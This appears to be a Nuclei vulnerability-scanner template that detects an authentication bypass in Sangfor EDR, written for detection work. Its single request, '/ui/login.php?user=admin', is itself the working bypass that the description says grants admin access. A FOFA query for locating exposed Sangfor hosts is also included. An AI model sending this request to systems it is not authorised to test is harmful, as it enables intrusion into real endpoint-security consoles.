id: sangfor-edr-auth-bypass
info:
  author: princechaddha
  description: 'A vulnerability in Sangfor EDR allows remote attackers to access the
    system with ''admin'' privileges by accessing the login page directly using a
    provided username rather than going through the login

    screen without providing a username.

    '
  metadata:
    fofa-query: app="sangfor"
  name: Sangfor EDR Authentication Bypass
  severity: high
  tags: sangfor,auth-bypass,login
requests:
- matchers:
  - part: body
    type: word
    words:
    - /download/edr_installer_
  - negative: true
    part: header
    type: word
    words:
    - Set-Cookie=""
  - part: header
    type: word
    words:
    - Set-Cookie=
  - status:
    - 302
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/ui/login.php?user=admin'
